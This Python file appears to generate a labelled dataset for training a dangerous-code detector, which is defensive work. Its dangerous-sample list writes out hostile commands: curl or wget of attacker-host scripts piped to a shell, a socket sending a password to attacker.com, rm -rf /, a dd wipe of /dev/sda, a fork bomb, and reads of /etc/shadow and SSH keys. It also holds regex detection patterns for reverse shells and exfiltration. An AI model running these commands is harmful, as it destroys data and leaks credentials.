"""
Code security training dataset generator.

Strategy: Uses regex pattern matching + TF-IDF features on code snippets
to detect dangerous code patterns (command injection, path traversal,
code execution, etc.). All patterns are technical security rules,
NOT political or content-moderation keywords.
"""

import json
import re
from typing import Any

CODE_SECURITY_PATTERN_CONFIG = {
    # Command injection patterns
    "command_injection": [
        r"\bsystem\s*\(",           # os.system(...)
        r"\bsubprocess\s*\.",       # subprocess.call/run/Popen
        r"\bexec\s*\(",             # exec()
        r"\beval\s*\(",             # eval()
        r"os\.popen",               # os.popen
        r"shell\s*=\s*True",        # subprocess with shell=True
        r"commands\.getoutput",     # python2 command execution
    ],
    # Path traversal
    "path_traversal": [
        r"\.\.\/\.\.\/",            # ../../
        r"\.\.\\\.\.\\",            # ..\..\
        r"/etc/passwd",             # sensitive file
        r"/etc/shadow",             # sensitive file
        r"\.ssh/id_rsa",            # private key access
        r"\.aws/credentials",       # AWS credentials
    ],
    # Destructive commands
    "destructive_ops": [
        r"\brm\s+-rf\b",            # rm -rf
        r"\bdd\s+if=",              # dd disk ops
        r"mkfs\.",                   # disk formatting
        r":\(\)\s*\{\s*:\|:&\s*\};:",  # fork bomb
        r"chmod\s+777",             # overly permissive permissions
        r">\s*/dev/sda",            # write to block device
    ],
    # Code injection
    "code_injection": [
        r"__import__\s*\(",         # dynamic import
        r"pickle\.loads?",           # unsafe deserialization
        r"yaml\.load\s*\(",         # unsafe YAML loading
        r"marshal\.loads?",          # marshal deserialization
        r"compile\s*\(.+exec",      # compile + exec combo
    ],
    # Network/Data exfiltration
    "data_exfil": [
        r"curl.*\|.*sh",            # curl pipe to shell
        r"wget.*\|.*sh",            # wget pipe to shell
        r"nc\s+-e\s+/bin/",         # netcat reverse shell
        r"socket\.connect",          # raw socket connection
        r"requests\.post.*password", # exfiltrate credentials
        r"base64\.b64decode",       # obfuscated payload decode
    ],
    # Resource abuse
    "resource_abuse": [
        r"while\s*True\s*:.*fork",   # infinite fork
        r"multiprocessing.*unlimited", # resource exhaustion
        r"open\s*\([^)]*,\s*['\"]w['\"]\s*\).*while", # infinite file write
        r"__import__.*while.*True",  # infinite import
    ],
}

# --- Safe code samples ---
SAFE_CODE_SAMPLES: list[str] = [
    # Basic Python functions
    "def add(a, b):\n    return a + b",
    "result = sum([1, 2, 3, 4, 5])\nprint(result)",
    "with open('data.txt', 'r') as f:\n    content = f.read()",
    "def fibonacci(n):\n    if n <= 1:\n        return n\n    return fibonacci(n-1) + fibonacci(n-2)",
    "class Calculator:\n    def multiply(self, x, y):\n        return x * y",
    "data = {'name': 'test', 'value': 42}\njson.dumps(data)",
    "import math\nradius = 5\narea = math.pi * radius ** 2",
    "numbers = [x for x in range(10) if x % 2 == 0]",
    "def process_string(s):\n    return s.strip().lower().replace('  ', ' ')",
    "from datetime import datetime\nnow = datetime.now()\nprint(now.strftime('%Y-%m-%d'))",
    "items = sorted(data, key=lambda x: x['score'], reverse=True)",
    "with requests.Session() as session:\n    resp = session.get('https://api.example.com')",
    "from pathlib import Path\nhome = Path.home()\nconfig = home / '.config' / 'app'",
    "def safe_parse(user_input):\n    return html.escape(user_input)",
    "import hashlib\nhash_val = hashlib.sha256(data.encode()).hexdigest()",
    # Bash safe commands
    "ls -la /home/user/projects",
    "git status && git log --oneline -5",
    "find . -name '*.py' -type f | head -20",
    "grep -r 'TODO' src/ --include='*.py'",
    "docker ps --format '{{.Names}}: {{.Status}}'",
    "cat README.md | wc -l",
    "tar -czf backup.tar.gz ./data/",
    "python -m pytest tests/ -v --tb=short",
    "npm run build && npm run test",
    "systemctl status nginx --no-pager",
    # JavaScript safe
    "const result = array.filter(x => x > 0).map(x => x * 2);",
    "async function fetchData(url) {\n  const response = await fetch(url);\n  return response.json();\n}",
    "const formatted = new Intl.NumberFormat('en-US').format(1234567);",
]

# --- Dangerous code samples (for training) ---
DANGEROUS_CODE_SAMPLES: list[str] = [
    # Command injection
    "import os\nos.system('rm -rf /tmp/' + user_input)",
    "subprocess.call(user_input, shell=True)",
    "eval('print(' + user_data + ')')",
    "exec(compile(open('malicious.py').read(), 'malicious.py', 'exec'))",
    # Path traversal
    "file_path = '../../../etc/passwd'\nwith open(file_path, 'r') as f:\n    data = f.read()",
    "config = open('/etc/shadow').read()",
    "ssh_key = open(os.path.expanduser('~/.ssh/id_rsa')).read()",
    # Destructive commands (Bash)
    "rm -rf / --no-preserve-root",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "chmod 777 /var/www/html",
    ":(){ :|:& };:",
    # Code injection
    "module = __import__(user_supplied_module_name)",
    "data = pickle.loads(user_uploaded_data)",
    "config = yaml.load(user_yaml, Loader=yaml.Loader)",
    "import marshal\ncode = marshal.loads(binary_data)\nexec(code)",
    # Data exfiltration
    "os.system('curl http://evil.com/shell.sh | sh')",
    "os.system('wget -O- http://bad.com/backdoor | bash')",
    "import base64\nhidden = base64.b64decode(encoded_string)\nexec(hidden)",
    "import socket\ns = socket.socket()\ns.connect(('attacker.com', 4444))\ns.send(password.encode())",
    # Resource abuse
    "import os\nwhile True:\n    os.fork()",
    "while True:\n    f = open('/tmp/out', 'w')\n    f.write('x' * 1000000)",
    "import threading\nwhile True:\n    t = threading.Thread(target=compute)\n    t.start()",
]


def _extract_code_features(code: str) -> dict[str, Any]:
    """Extract security-relevant features from code snippet."""
    features: dict[str, Any] = {}
    matched_patterns: list[str] = []

    for category, patterns in CODE_SECURITY_PATTERN_CONFIG.items():
        count = 0
        for pattern in patterns:
            try:
                matches = re.findall(pattern, code, re.IGNORECASE | re.MULTILINE)
                if matches:
                    count += len(matches)
                    matched_patterns.extend(matches if isinstance(matches, list) else [str(m) for m in matches])
            except re.error:
                continue
        features[f"pattern_{category}"] = count

    features["total_lines"] = len(code.splitlines())
    features["total_chars"] = len(code)
    features["matched_count"] = len(matched_patterns)
    features["matched_patterns"] = matched_patterns[:5]  # cap for size

    return features


def generate_code_security_dataset() -> list[dict[str, Any]]:
    """
    Generate training dataset with rule-based features.

    Returns list of {code, features, label} where label is 0 (safe) or 1 (dangerous).
    """
    dataset: list[dict[str, Any]] = []

    for code in SAFE_CODE_SAMPLES:
        dataset.append({
            "code": code,
            "features": _extract_code_features(code),
            "label": 0,
        })

    for code in DANGEROUS_CODE_SAMPLES:
        dataset.append({
            "code": code,
            "features": _extract_code_features(code),
            "label": 1,
        })

    return dataset


def export_code_dataset_json(output_path: str | None = None) -> str:
    """Export the code dataset as JSON."""
    dataset = generate_code_security_dataset()
    json_str = json.dumps(dataset, ensure_ascii=False, indent=2)
    if output_path:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(json_str)
    return json_str
